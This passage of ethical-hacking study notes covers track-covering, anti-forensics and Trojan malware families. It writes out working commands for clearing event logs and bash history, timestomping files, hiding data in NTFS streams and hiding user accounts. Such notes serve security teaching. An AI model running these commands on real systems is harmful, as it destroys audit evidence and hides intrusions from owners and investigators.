			- Clear PowerShell logs using Clear-EventLog:
				- Clear the entries from the PowerShell event log: Clear-EventLog "Windows PowerShell"
				- Clear specific multiple log types: Clear-EventLog -LogName ODiag, OSession -ComputerName localhost, Server02
					- This command clears all the log entries in Microsoft Office Diagnostics (ODiag) and Microsoft Office Sessions (OSession) on the local computer and Server02 remote computer.
				- Clear all the logs on the specified systems, and then display the event log list: Clear-EventLog -LogName application, system -confirm
			- Clear event logs using wevtutil utility:
				- Display list of event logs: wevtutil el
				- Clear the event logs: wevtutil cl <log_name>
			- Manually Clearing Event Logs:
				- Windows:
					- Navigate to Start -> Control Panel -> System and Security -> Windows Tools -> double-click Event Viewer
					- Delete the all the log entries logged while compromising the system
				- Linux:
					- Navigate to the /var/log directory on the Linux system
					- Open the plaintext file containing log messages with text editor /var/log/<filename.log>
					- Delete all the log entries logged while compromising the system
		- Manipulating Logs:
			- An attacker alters logs to prevent detection and avoid legal consequences.
		- Covering Tracks on the Network:
			- An attacker employs techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and manipulation of TCP parameters to hide their activities on the network.
			- Using Reverse HTTP Shells:
				- The attacker installs a reverse HTTP shell on the victim’s machine, designed to request commands from an external controller operating the reverse HTTP shell. In this setup, the victim acts as a web client executing HTTP GET requests, while the attacker functions as a web server, responding to these requests. This type of traffic is often perceived as normal by an organization’s network perimeter security controls, such as DMZs, firewalls, and similar systems.
			- Using Reverse ICMP Tunnels:
				- The attacker employs an ICMP tunneling technique, using ICMP echo and ICMP reply packets to carry TCP payloads, enabling stealthy access to or control of a system. The victim's system is manipulated to encapsulate the TCP payload within an ICMP echo packet, which is then sent to the proxy server. Many organizations have security mechanisms that focus on inspecting incoming ICMP packets but neglect outgoing ICMP packets, allowing attackers to bypass firewalls with relative ease.
			- Using DNS Tunneling:
				- Attackers can leverage DNS tunneling to embed malicious content or data from other programs within DNS queries and responses. This technique establishes a covert channel to communicate with remote servers and applications. Through this back channel, attackers can exfiltrate stolen, confidential, or sensitive information from the targeted server.
			- Using TCP Parameters:
				- Attackers can exploit TCP parameters to distribute payloads and establish covert channels.
				- The TCP fields where data can be concealed include:
					- IP Identification Field : This method involves transferring a payload bit by bit over an established session between two systems. In this approach, one character is encapsulated within each packet.
					- TCP Acknowledgment Number : This method is more complex as it involves the use of a bounce server. The bounce server receives packets from the victim and forwards them to the attacker. In this approach, one hidden character is relayed by the bounce server per packet.
					- TCP Initial Sequence Number : This method does not require an established connection between the two systems. In this approach, one hidden character is encapsulated within each SYN request and reset packet.
		- Covering Tracks on the OS:
			- Windows:
				- NTFS includes a feature called Alternate Data Streams (ADS), which can be exploited by attackers to hide malicious files within legitimate files.
				- Hide file using NTFS:
					- Open the Command Prompt with elevated privileges.
					- Run command: type C:\SecretFile.txt > C:\LegitFile.txt:SecretFile.txt
					- In this case, the "SecretFile.txt" is hidden within "LegitFile.txt" on the C: drive.
					- View the hidden file by hidden file's name: more < C:\LegitFile.txt:SecretFile.txt
				- Modifying Date and Time (changing the access time of specific files):
					- timestomp file_name.doc -z “<Date> <time>”
					- powershell -Command (Get-Item $File_name).LastWriteTime = $(Get-Date).AddHours(-10)
					- Change access time: touch -a -d '<date> <time>' $File_name
					- Change date and time of last modification: touch -m -d '<date> <time>' $File_name
			- UNIX/LINUX:
				- In UNIX, files can be hidden by simply appending a dot (.) at the beginning of the file name.
				- Covering BASH Shell Tracks:
					- BASH is an sh-compatible shell that stores command history in a file located at ~/.bash_history
					- Disabling history: export HISTSIZE=0
					- Clear stored history: history –c
					- Clear history of current shell: history -w
					- Clear user's complete history: cat /dev/null > ~/.bash_history && history -c && exit
					- Shred history file (making its content unreadable): shred ~/.bash_history
					- Shred history file and clear evidence of command: shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit
		- Deleting Files:
			- Delete Files using Cipher.exe:
				- Cipher.exe is an in-built Windows command-line tool that can be used to securely delete data by overwriting it, making it difficult to recover in the future.
				- To overwrite deleted files in specific folder: cipher /w:<drive_letter>:\<folder_name>
				- To overwrite all the deleted files in drive: cipher /w:<drive_letter>
		- Disabling Windows Functionality:
			- An attacker disables Windows features, such as last access timestamps, hibernation, virtual memory, and system restore points, to cover their tracks.
			- Disable the Last Access Timestamp:
				- The last access timestamp of a file records the date and time when the file was last opened for reading or writing. Each time a user accesses the file, the timestamp is updated.
				- Fsutil is a Windows utility used to configure NTFS volume behavior parameters, such as DisableLastAccess, which controls the enabling or disabling of the last access timestamp.
				- Disable last access updates: fsutil behavior set disablelastaccess 1
				- Enable last access updates: fsutil behavior set disablelastaccess 0
			- Disable Windows Hibernation:
				- The hibernation file (Hiberfil.sys) is a hidden system file located in the root directory of the drive where the operating system is installed. This file stores the contents of the system's RAM on the hard disk when the user selects to hibernate the system.
				- Windows hibernation can be disabled using either the Registry Editor or the powercfg command.
				- Disable Windows hibernation through the Registry Editor:
					- Open the Registry Editor and navigate to the path: Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power
					- In the right pane, double-click on HibernateEnabledDefault; the Edit DWORD (32-bit) Value dialog box will appear.
					- In the Value data field, enter 0 to disable hibernation.
					- Click OK to apply the changes.
				- Disable Windows hibernation using powercfg:
					- Launch the Command Prompt with administrator privileges.
					- Disable hibernation: powercfg.exe /hibernate off
			- Disable Windows Virtual Memory (Paging File)
				- Virtual memory, also called the paging file, is a special file in Windows used as compensation when physical memory (RAM) falls short of available space. For example, if an attacker has an encrypted file and wants to read it, it must first be decrypted. The decrypted data may remain in the paging file even after the attacker logs out of the system.
				- Disable paging:
					- Open the Control Panel and navigate to: System and Security -> System -> Advanced system settings
					- A System Properties dialog box will appear. In the Advanced tab, click Settings under the Performance section.
					- The Performance Options dialog box will appear. Go to the Advanced tab and click Change under the Virtual Memory section.
					- In the Virtual Memory dialog box, uncheck Automatically manage paging file size for all drives.
					- Select the drive where paging should be disabled, then check the option No paging file and click Set.
					- In the System Properties window, click Yes.
					- Finally, click OK to apply the changes.
			- Disable System Restore Points:
				- System restore points contain information about hidden data and previously deleted files, which poses a risk for attackers, as deleted files can be recovered from earlier restore points.
				- Disable system restore points:
					- Open the Control Panel and navigate to: System and Security -> System -> System Protection
					- A System Properties dialog box will appear. In the System Protection tab, select the drive and click Configure
					- Under the Restore Settings section, select the Disable system protection option and click the Delete button.
					- The System Protection wizard will appear; click Continue to delete all restore points on the drive.
					- Click OK to apply the changes.
					- Repeat the above steps for all disk partitions.
			- Disable Windows Thumbnail Cache:
				- Thumbs.db is a Windows file that stores thumbnails of document types such as PPTX and DOCX, as well as graphic files like GIF, JPEG, PNG, and TIFF. This thumbnail file contains information about files that were previously deleted or accessed on the system.
				- For example, if an attacker used an image file to hide a malicious file and later deleted it, a thumbnail of this image would be stored inside the thumbs.db file, revealing that the deleted file was previously used on the system.
				- Disable the thumbnail cache:
					- Press the Windows + R keys to open the Run dialog box.
					- Type gpedit.msc and press Enter or click OK.
					- The Local Group Policy Editor window will appear. Navigate to: User Configuration -> Administrative Templates -> Windows Components -> File Explorer
					- Double-click on the "Turn off the caching of thumbnails in hidden thumbs.db files" setting in the right pane.
					- Select Enabled to turn off the thumbnail cache.
					- Click OK to apply the changes.
			- Disable Windows Prefetch Feature:
				- Prefetch is a Windows feature that stores data about applications typically used by system users. This stored data helps enhance system performance by reducing the time required to load or start applications.
				- For example, if an attacker installs and then uninstalls a malicious application, a record of that application may still be stored in the Prefetch file. These Prefetch files can be useful for security personnel in recovering information about deleted applications during the investigation of a security incident.
				- Disable the Prefetch feature:
					- Press the Windows + R keys to open the Run dialog box.
					- Type services.msc and press Enter or click OK.
					- Search for the SysMain (Superfetch) service, then double-click it to open the SysMain Properties (Local Computer) window.
					- In the Startup type drop-down menu, select Disabled.
					- Click OK to apply the changes.
			- Clear Online Tracks from Privacy Settings (Windows 11):
				- Right-click on the Start button, select Settings, and navigate to Personalization.
				- In the Personalization section, click on Start in the left pane.
				- Turn off both "Show most used apps" and "Show recently opened items in Start, Jump Lists, and File Explorer."
			- Clear Online Tracks From the Registry (Windows 11):
				- Open the Registry Editor by pressing Win + R, typing regedit, and pressing Enter.
				- Navigate to: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
				- Locate and remove the key for "RecentDocs".
				- Delete all values except for "(Default)".
		- Delete Windows History:
			- Deleting Windows Activity History:
				- Attackers can cover their tracks by deleting the Windows Activity history after unauthorized system use, thereby removing evidence of their activities. Since the Windows Activity history records user activities, including file access, application usage, and browsing history, erasing this data can help conceal their presence and actions on the compromised system.
				- Delete Windows Activity History:
					- Open the Settings by clicking the Start button or by pressing the Win + I keys together.
					- In the Settings window, click on Privacy & security in the left pane, then click on the Activity history section in the right pane.
					- Click the Clear button under the Clear activity history section.
					- Click OK on the pop-up to confirm clearing the activity history.
					- Once the process is complete, a checkmark will appear next to the Clear button, indicating the action was successful.
		- Deleting Incognito History:
			- Attackers use incognito mode to prevent the browser from storing browsing history, cookies, and other site data locally on the device. Incognito mode helps attackers conceal their online activities from others who may have access to the device.
			- Deleting Incognito History in Windows:
				- Open the Start menu, search for Command Prompt, and select Run as administrator.
				- Display the list of recently visited domains, including those accessed in incognito mode: ipconfig /displaydns
				- Clear all DNS cache entries and remove traces of recent browsing history: ipconfig /flushdns
			- Deleting Incognito History in macOS:
				- Open the Applications folder, select Utilities, and run Terminal.
				- Delete the incognito browsing history: sudo killall -INFO mDNSResponder
		- Hiding Artifacts:
			- Attackers often attempt to conceal artifacts related to their malicious activities in order to bypass security controls. Every operating system hides artifacts, such as internal task execution data and critical system files. Attackers take advantage of this feature to hide their own artifacts - such as directories, user accounts, files, folders, or other system-related elements - within existing system artifacts to evade detection.
			- Hiding Artifacts in Windows:
				- Hiding Files and Folders: attrib +h +s +r <FolderName>
				- Hiding Users:
					- Create hidden user account: net user <UserName> /add
					- Activate the account for exploitation: net user <UserName> /active:yes
					- Hide the account when it is not required: net user <UserName> /active:no
				- Hiding User Accounts:
					- Open Registry Editor and navigate to following location: HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon
					- Right-click on Winlogon, hover over New, and select Key.
					- Rename the newly created key to <Account1>. Next, right-click on <Account1>, hover over New, and select Key, then rename it to <Account2>.
					- Right-click on <Account2>, hover over New, and select DWORD (32-bit) Value.
					- Rename the new DWORD value to <UserName>, where <UserName> is the name of the user account to hide.
			- Hiding Artifacts in Linux:
				- Hiding Files and Folders:
					- In Linux, files or folders can be hidden by prefixing the file name with a dot (.)
			- Hiding Artifacts in macOS:
				- Hiding Files and Folder:
					- Hide files: defaults write com.apple.finder AppleShowAllFiles FALSE killall Finder
					- Hide specified file (Add space at the end): chflags hidden <filename>
		- Clear Online Tracks:
			- Attackers can erase online traces stored on the target computer, including web history, logs, cookies, cache, download records, and timestamps of visited sites. This prevents victims from detecting the online activities conducted by the attackers.
			- Ways to Clear:
				- Use private browsing
				- Delete history in the address field
				- Disable stored history
				- Delete private data
				- Clear cookies on exit
				- Clear cache on exit
				- Delete downloads
				- Disable password manager
				- Clear data in the password manager
				- Delete saved sessions
				- Delete user JavaScript
				- Set up multiple users
				- Remove Most Recently Used (MRU)
				- Clear toolbar data from browsers
				- Turn off AutoComplete
	- Anti-forensics for Covering Tracks:
		- Anti-forensics is a set of techniques used by attackers or perpetrators to conceal their malicious activities. By employing anti-forensics methods, attackers erase, alter, or conceal various actions taken to compromise a target system or network.
		- Anti-forensics Techniques:
			- Data/File Deletion : When a file is deleted from the hard drive, the operating system removes the pointer to the file. In the case of the Windows operating system, deleted data remains in the Recycle Bin if attackers use the normal delete operation, rather than the Shift+Delete operation. To prevent the recovery of such deleted files, attackers may hide or delete the metadata associated with the files in the Recycle Bin.
			- Password Protection : Attackers use password protection techniques to conceal malicious activities, prevent the reverse engineering of applications, prevent information extraction from network devices, and prevent access to critical files and folders on the system or hard disk.
			- Steganography : Attackers use steganography to hide information when encryption is unfeasible. Attackers can embed information such as the source code for a hacking tool, a list of compromised servers, plans for future attacks, and communication or coordination channels as part of a steganographic attempt.
			- Data Hiding in File System Structures : Data hiding is an anti-forensic technique employed by attackers to render data inaccessible. $BadClus is a sparse file that allows attackers to hide unlimited data, as they can allocate additional clusters to $BadClus to conceal more data. Some hard disks have Host-Protected Areas (HPAs), where developers can store data they want to protect (and hide) from normal use. An attacker with malicious intent can exploit these areas to hide illicit data. In addition to these techniques, attackers use DPAs (Data Partition Areas) and slack spaces to hide data that are not visible to either the BIOS or the operating system, requiring special tools to detect and view.
			- Minimizing Footprint : Attackers often leave minimal or no footprints after executing an attack. The goal is to carry out the attack without raising alarms and then eliminate all traces of their actions. To minimize footprints, attackers utilize various resources, such as stolen identities, virtual machines, cloud infrastructure, untraceable cryptocurrencies, and running operating systems from Live USBs or External HDD.
			- Trail Obfuscation : The purpose of trail obfuscation is to delete evidence and conceal the traces of malicious activities to evade detection by defensive systems. Attackers perform trail obfuscation through log tampering, generating false email headers, modifying timestamps, and altering various file headers. Tools such as Timestomp and Transmogrify are used by attackers to modify, edit, and delete date and time metadata on files, making it difficult for security professionals to trace the attacker’s origin.
				- Trail obfuscation using other tools and techniques:
					- Log cleaners
					- Zombie accounts
					- Spoofing
					- Trojan commands
					- Misinformation
			- Artifact Wiping : Artifact wiping refers to the process of permanently deleting or destroying evidence data using file-wiping and disk-cleaning utilities, disk degaussing/destruction, and disk formatting techniques. The primary purpose of artifact wiping is to eliminate traces of unauthorized activities on a computer system or storage device, making it difficult for security professionals to accurately reconstruct events and identify the culprit.
				- Attackers use various tools for artifact wiping:
					- BCWipe
					- Total WipeOut
					- DriveScrubber
					- Disk Wipe
					- KillDisk
					- R-Wipe & Clean
					- BitRaser File Eraser
					- Blancco File Eraser
			- Overwriting Data/Metadata : Data overwriting is one of the most common and widely used anti-forensic techniques employed by attackers. In this technique, attackers overwrite all addressable locations on digital storage media with random characters. They may also use standard data-wiping tools and techniques, such as simple deletion, data shredding, and data wiping, which perform multiple overwrites on the media to cover their tracks. As a result, it becomes difficult for security professionals and defensive systems to retrieve traces of the attack from the digital media.
			- Program Packers : Attackers use program packers to hide their data by compressing files with various cryptographic algorithms. This technique allows attackers to conceal evidence files in containers, making them difficult to detect. Password-protected program packers can present a challenge for security professionals, as they must first decrypt the password to unpack the file. These packers also help attackers conceal tools used in the attack, making it harder to trace them through reverse engineering attempts.
				- Attackers use various packers:
					- UPX
					- PECompact
					- BurnEye
					- Exe Stealth Packer
					- Smart Packer Pro
			- Access Anonymization : Access anonymization refers to techniques used by attackers to hide their digital footprints by anonymizing their access to systems, networks, or data. This process aims to make it more difficult for security professionals to trace malicious activities back to specific individuals or entities. Attackers use tools such as proxy servers, anonymization services, Tor networks, traffic padding, and anonymous communication channels for access anonymization.
	- Track-Covering Tools: Track-covering tools help attackers clean up all traces of computer and internet activities on the target system. These tools free cache space, delete cookies, clear internet history and shared temporary files, erase logs, and discard junk files.
		- CCleaner : CCleaner is a system optimization, privacy, and cleaning tool. It removes traces of temporary files, unused files, log files, registry entries, memory dumps, and online activities such as internet history.
		- DBAN : Delete information stored on hard disk drives (HDDs, not SSDs) and remove viruses and spyware from Microsoft Windows installations.
		- Privacy Eraser Free : A single, all-encompassing privacy suite that cleans up internet browsing history, cookies, saved passwords, recent documents, clipboard data, Windows run history, etc.
		- Wipe : Efficiently managing storage space by removing temporary files, caches, cookies, and browsing history. Additionally, eliminating unnecessary data minimizes the risk of unauthorized access, ensuring online activities remain confidential and protected from potential threats (privacyroot.com)
		- BleachBit : BleachBit is an open-source tool designed for Linux and Windows systems. It frees cache, deletes cookies, clears internet history, shreds temporary files, deletes logs, and discards junk. It wipes clean traces from thousands of applications, including Firefox, Adobe Flash, Google Chrome, Opera, and more. Beyond simply deleting files, BleachBit includes advanced features such as shredding files to prevent recovery, wiping free disk space to hide traces of files deleted by other applications, and vacuuming Firefox to improve its performance.
		- east-tec Eraser : east-tec Eraser is a privacy protection software that erases all files that store evidence of computer and internet activities. It helps keep PC clean by deleting large amounts of unnecessary data stored on computer, with or without approval.


--------------------------------------------------

# Malware Threats

- Malware
	- Malware is malicious software designed to damage or disable computer systems, giving the malware creator limited or full control over the system for malicious activities such as theft or fraud. It may delete files, slow down computers, steal personal information, send spam, or commit fraud.
	- Techniques for Distributing Malware on the Web (Security Threat Report - www.sophos.com):
		- Black Hat Search Engine Optimization (SEO) : Black hat SEO (also referred to as unethical SEO) uses aggressive SEO tactics, such as keyword stuffing, inserting doorway pages, page swapping, and adding unrelated keywords, to get higher search engine rankings for malware pages.
		- Social Engineered Click-jacking : Attackers inject malware into websites that appear legitimate to trick users into clicking them. When clicked, the malware embedded in the link executes without the user's knowledge or consent.
		- Spear-phishing Sites : This technique is used to mimic legitimate institutions, such as banks, to steal passwords, credit card and bank account information, and other sensitive data.
		- Malvertising : This technique involves embedding malware-laden advertisements in legitimate online advertising channels to spread malware to the systems of unsuspecting users.
		- Compromised Legitimate Websites : Often, attackers use compromised websites to infect systems with malware. When an unsuspecting user visits the compromised website, they unknowingly install the malware on their system, after which the malware performs malicious activities.
		- Drive-by Downloads : This refers to the unintentional downloading of software via the Internet. In this case, an attacker exploits flaws in browser software to install malware simply by visiting a website.
		- Spam Emails : The attacker attaches a malicious file to an email attachment or embeds the malware in the email body and sends the email to multiple target addresses. The victim is tricked into clicking the attachment, thus executing the malware and compromising their machine.
		- Rich Text Format (RTF) Injection : RTF injection involves exploiting features of Microsoft Office, such as RTF template files stored locally or on a remote machine. RTF templates are used to specify the document format. Attackers inject malicious macros into RTF files and host them on their servers. When a user opens the document, the malicious template is automatically retrieved from the remote server, evading security systems.
	- Components of Malware Malware:
		- Crypter : It is a software program designed to conceal the existence of malware. Attackers use this software to evade antivirus detection and protect the malware from reverse engineering or analysis, making it difficult for security mechanisms to detect.
		- Downloader : It is a type of Trojan that downloads other malware or malicious code and files from the Internet. Usually, attackers install a downloader when they first gain access to a system.
		- Dropper : It is a covert carrier of malware. Attackers embed malicious malware files inside droppers, which can perform the installation task covertly. Attackers must first install the malware program or code on the system to execute the dropper. The dropper can transport malware and execute it on a target system without being detected by antivirus scanners.
		- Exploit : It is the part of the malware that contains code or a sequence of commands that can take advantage of a bug or vulnerability to breach the system’s security. Based on the type of vulnerabilities exploited, exploits are categorized into local exploits and remote exploits.
		- Injector : This program injects exploits or malicious code from the malware into other vulnerable running processes and alters the execution method to hide or prevent its removal.
		- Obfuscator: It is a program that conceals the malicious code of malware using various techniques, making it difficult for security mechanisms to detect or remove it.
		- Packer: This software compresses the malware file, converting the code and data into an unreadable format. It uses compression techniques to pack the malware.
		- Payload : It is the part of the malware that performs the desired activity when activated. It may be used to delete or modify files, degrade system performance, open ports, change settings, etc., in order to compromise system security.
		- Malicious Code : This is a piece of code that defines the basic functionality of the malware and contains commands that lead to security breaches.
	- Potentially Unwanted Applications (PUAs):
		- Potentially unwanted applications or programs (PUAs or PUPs), also known as grayware or junkware, are potentially harmful applications that may pose significant risks to the security and privacy of data stored on the system where they are installed.
		- Types of PUAs:
			- Adware : These PUAs display unsolicited advertisements offering free sales, issue bogus reminders about outdated software or OS, and show pop-ups for online services while browsing websites. They may disrupt normal activities and lure victims into clicking on malicious URLs.
			- Torrent : When using torrent applications to download large files, the user may be compelled to download unwanted programs that have peer-to-peer file sharing features.
			- Marketing : Marketing PUAs track users' online activities and transmit browser details along with information about personal interests to third-party app owners. These applications then use this data to market products and resources tailored to users’ preferences.
			- Cryptomining : Cryptomining PUAs exploit victims' system resources and may access financial data to perform digital cryptocurrency mining, such as generating bitcoins.
			- Dialers : Dialers, or spyware dialers, are programs that automatically install and configure themselves on a system to make calls to a set of contacts at various locations without the user's consent. These dialers can result in massive telephone bills and are often difficult to detect and remove.
- Advanced Persistent Threats
	- Advanced Persistent Threats (APTs) are a type of network attack in which an attacker gains unauthorized access to a target network and remains undetected for an extended period. The primary objective of APTs is to steal sensitive information rather than to sabotage the organization or its network.
- Trojan
	- A Trojan is a program that conceals malicious or harmful code within an apparently harmless program or data, which can later gain control of the system and cause damage. Trojans are activated when a user performs certain predefined actions.
	- Trojans operate with the same level of privileges as the victim. For instance, if a victim has the privileges to delete files, transmit information, modify existing files, or install programs (including those that provide unauthorized network access or execute privilege escalation attacks), the Trojan, once it infects the system, inherits these privileges. Additionally, it may attempt to exploit vulnerabilities to gain even higher levels of access than the user running it.
	- Trojans Are Used For:
		- Steal sensitive information such as account data, including login credentials, email addresses, and passwords.
		- Record screenshots, audio, and video from the victim's PC.
		- Disable firewalls and antivirus software.
		- Create backdoors to gain remote access.
		- Exploit the victim's PC as a proxy server for relaying attacks.
		- Use the victim's PC as part of a botnet to carry out DDoS (Distributed Denial of Service) attacks.
		- Generate fake traffic to execute DoS (Denial of Service) attacks.
		- Use the victim's PC for spamming and sending bulk email messages.
		- Delete or replace critical operating system files.
		- Encrypt the victim's machine, rendering it inaccessible to the victim, and prevent access to its contents.
	- Common Ports Used by Trojans:
		- Ports serve as entry and exit points for data traffic. There are two types of ports: hardware ports and software ports. In an operating system, ports are software-based and typically function as entry and exit points for application traffic.
	- Types of Trojans:
		- Remote Access Trojans:
			- Remote Access Trojans (RATs) provide attackers with full control over the victim's system, allowing them to remotely access files, private conversations, accounting data, and more. The RAT functions as a server and listens on a port that is typically not meant to be accessible to internet attackers.
			- Remcos RAT : Remcos RAT (Remote Control and Monitoring System) is a powerful remote access trojan (RAT) designed to provide attackers with full control over an infected system. It is typically used for cyber espionage, theft of sensitive data, or other malicious activities. Key features of Remcos RAT include remote control, keylogging, screen capture, audio and video recording, file management, persistence, password stealing, data exfiltration, proxies and VPNs, and encryption.
			- Additional RATs: Parallax RAT, AsyncRAT, Xeno RAT, Kedi RAT, AhMyth, MagicRAT, NetSupport RAT, StrRAT and Ratty, MINEBRIDGE
		- Backdoor Trojans:
			- A backdoor is a program that allows unauthorized access to a system by bypassing standard authentication mechanisms or conventional security measures, such as IDS and firewalls, without detection. Backdoors are used by attackers for uninterrupted access to the target machine. In these types of breaches, hackers exploit backdoor programs to gain access to the victim's computer or network.
			- TinyTurla-NG (TTNG) : TinyTurla-NG (TTNG) is a backdoor Trojan operated by the Turla APT group, a Russian cyber-espionage threat actor. This backdoor Trojan enables attackers to gain remote access and control over infected systems, facilitating the exfiltration of sensitive data, execution of commands, and the conduct of various malicious activities. Attackers use compromised WordPress-based websites as command-and-control (C2) endpoints for the TTNG backdoor.
			- Additional Backdoor Trojans: SmokeLoader, BazarLoader, Kovter, POWERSTATS v3, RogueRobin, ServHelper, SpeakUp linux backdoor, Winnti backdoor, Daxin, SysJoker, PortDoor, GoldenSpy
		- Botnet Trojans:
			- Attackers, also known as "bot herders," use botnet Trojans to infect a large number of computers across a wide geographical area, creating a network of bots (or a "bot herd") that can be controlled via a command-and-control (C&C) center.
			- RDDoS : RDDoS is a botnet Trojan capable of executing commands and carrying out DDoS attacks on target systems. It leverages online parameters that enable attackers to differentiate between types of infected devices. Additionally, it can distinguish between sandboxes and real devices based on the operating parameters embedded in the online packages.
			- Additional Botnet Trojans: Horabot, hailBot, kiraiBot, catDDoS, ZeroBot, XorDdos, Nexus Android botnet, Satori, Torii botnet, Qakbot, Hide n Seek, Ramnit, Panda, BetaBot
		- Rootkit Trojans:
			- A "rootkit" combines "root" (administrator access) and "kit" (tools for gaining access). It is a powerful backdoor that targets the root or OS, providing attackers full control. Unlike typical backdoors, rootkits are hard to detect, as they do not appear in services, task lists, or registries.
			- Reptile Rootkit : Reptile is a kernel module rootkit primarily designed to target Linux-based systems. It offers advanced features, including a reverse shell and the ability to conceal its presence. Attackers can use the reverse shell to gain control of the target system.
			- Additional Rootkit Trojans: CEIDPageLock, Wingbird, GrayFish, Finfisher, ZeroAccess, Whistler, Fire Chili rootkit, Purple Fox Rootkit, Dubbed Demodex Rootkit, MoonBounce, Moriya, iLOBleed
		- E-Banking Trojans:
			- E-banking Trojans are a major threat to online banking. They intercept the victim's account information before it is encrypted and sent to the attacker's command-and-control center. Banking Trojans steal users' information through methods such as keylogging, form data capture, inserting fraudulent form fields, screen captures, video recording, mimicking financial websites, redirecting to banking sites, and man-in-the-middle attacks.
			- CHAVECLOAK : CHAVECLOAK is a banking Trojan that uses advanced techniques to exfiltrate financial data from targeted users. The attack begins with the download of a malicious ZIP file disguised as a PDF, which then employs methods like DLL side-loading to execute the malware.
			- Additional E-Banking Trojans: Grandoreiro, Ursnif (Gozi), Nexus, DanaBot, QakBot (Qbot), Ramnit, IcedID, Emotet
		- Point-of-Sale Trojans:
			- As the name suggests, point-of-sale (POS) Trojans are financial malware that target POS and payment devices like credit/debit card readers. Attackers use POS Trojans to compromise these devices and steal sensitive information, such as credit card numbers, cardholder names, and CVV codes.
			- Prilex POS : Prilex is a Brazilian threat actor group that primarily targets POS terminals to steal sensitive information. The attackers often pose as POS technicians, tricking targets into installing malicious software disguised as a required update. They may either visit stores in person as technical specialists or request remote access by having vendors install remote desktop apps like AnyDesk.
			- Additional POS Trojans: LockPOS, BlackPOS, FastPOS, PunkeyPOS, CenterPOS, MalumPOS
		- Defacement:
			- Defacement Trojans, once spread through a system, can destroy or alter database content. They are particularly dangerous when targeting websites, as they modify the underlying HTML, altering the site's content.
			- Restorator : Restorator is a utility for editing Windows resources in applications and components (e.g., .exe, .dll, .res, .rc, and .dcr files). It enables users to modify, add, or remove resources like text, images, icons, sounds, videos, versions, dialogs, and menus in most programs. This tool is useful for translation, localization, customization, design enhancement, and development.
		- Service Protocol Trojans:
			- Service Protocol Trojans exploit vulnerable service protocols like VNC, HTTP/HTTPS, and ICMP to attack the victim’s machine.
			- VNC Trojans : A VNC Trojan starts a VNC server daemon on the victim's system, allowing the attacker to connect via any VNC viewer. Since VNC is a legitimate utility, this Trojan is difficult for antivirus software to detect. Well-known financial malware like Vultur, Dridex, and Gozi use a hidden virtual network computing (HVNC) module, enabling attackers to gain user-level access to an infected PC.
			- HTTP/HTTPS Trojans : HTTP/HTTPS Trojans bypass firewalls by working in reverse, unlike a standard HTTP tunnel. They use web-based interfaces and port 80. The Trojan executes on the internal host, spawning a child program at a scheduled time. Since the child program appears as a legitimate user to the firewall, it is granted internet access. However, it then runs a local shell, connects to the attacker’s web server via a seemingly legitimate HTTP request, and sends a ready signal.
			- SHTTPD : SHTTPD is a lightweight HTTP server that can be embedded into any program. It can be wrapped in a legitimate program (e.g., chess.exe), and when executed, it turns the computer into an invisible web server.
			- HTTP RAT : HTTP RAT uses web interfaces and port 80 to gain access, functioning like an HTTP tunnel but in reverse. These Trojans are particularly dangerous as they can operate virtually anywhere with internet access.
			- ICMP Trojans : The Internet Control Message Protocol (ICMP) is an essential part of IP, required for all IP modules. It is a connectionless protocol that sends error messages to unicast addresses and encapsulates packets within IP datagrams.
		- Mobile Trojans:
			- Mobile Trojans are malicious apps that target mobile phones. The attacker tricks the victim into installing the app, which then performs various attacks, including stealing banking and social networking credentials, encrypting data, and locking the device.
			- Chameleon : Chameleon is a banking Trojan targeting Android devices, distributed through various methods, primarily phishing pages. It adapts to multiple commands, including verifying app package names, and mainly targets mobile banking apps. By using the proxy feature, it can manipulate the device as the victim, enabling attackers to carry out device takeover (DTO) and account takeover (ATO) attacks through Accessibility Service privileges.
			- Additional Mobile Trojans: Vultur, PixPirate, GoldPickaxe, GoldDigger, SpyNote, Anatsa, Xenomorph
		- IoT Trojans:
			- The Internet of Things (IoT) refers to the interconnection of physical devices, buildings, and other items embedded with electronics. IoT Trojans are malicious programs that target IoT networks, using a botnet to attack other machines outside the network.
			- OpenSSH Trojan : Microsoft researchers have uncovered a sophisticated cyberattack targeting Linux-based systems and IoT devices exposed to the internet. The attackers exploited a modified version of OpenSSH to gain control and install cryptomining malware. A backdoor was deployed to run malicious tools, including rootkits and an IRC bot, hijacking the compromised devices' computing resources for cryptomining.
			- Additional IoT Trojans: Ttint, XorDdos, Mozi, Silex BrickerBot, Torii botnet, Bashlite IoT Malware, Gafgy Botnet, Katana, BotenaGo, Dark Nexus
		- Security Software Disabler Trojans: 
			- Security software disabler Trojans disable security programs like firewalls and IDS by either shutting them down or killing their processes. These entry Trojans pave the way for attackers to launch subsequent attacks on the target system.
			- Security Software Disabler Trojans: Chameleon, CertLock, GhostHook
		- Destructive Trojans:
			- Destructive Trojans are designed solely to delete files on a target system. Often undetected by antivirus software, they randomly delete files, folders, registry entries, and data on local and network drives, potentially causing OS failure.
			- Destructive Trojans: SilverRAT, HermeticWiper, WhisperGate, FoxBlade
		- DDoS Attack Trojans:
			- These Trojans are designed to carry out DDoS attacks on target machines, networks, or websites. They turn the victim into a zombie, awaiting commands from a DDoS server on the internet.
			- Mirai IoT botnet Trojan : The Mirai IoT botnet Trojan remains one of the most notorious DDoS attack Trojans.
			- DDoS attack Trojans: RDDoS, Horabot, hailBot, kiraiBot, and catDDoS
		- Command Shell Trojans:
			- A command shell Trojan provides remote control of a victim's machine by installing a Trojan server that opens a port for the attacker to connect. The attacker’s machine runs the client to launch the command shell on the victim's system.
			- Command Shell Trojans: Netcat, DNS Messenger, GCat
	- Infect Systems Using Trojan:
		- Step 1: Creating Trojan:
			- Attackers can create Trojans using various Trojan horse construction kits, such as DarkHorse Trojan Virus Maker, njRAT, and Trojan Horse Construction Kit. Crafting a new Trojan packet enhances the likelihood of successfully compromising the target system, as security mechanisms may fail to detect it. These Trojans can be delivered to the victim’s machine via a dropper or downloader.
			- Trojan Horse Construction Kits: DarkHorse Trojan Virus Maker, njRAT, Trojan Horse Construction Kit, Social Engineering Toolkit (SET), THorse, Senna Spy Trojan Generator, THOSE RAT, Umbra Loader - Botnet Trojan Maker, VenomRAT
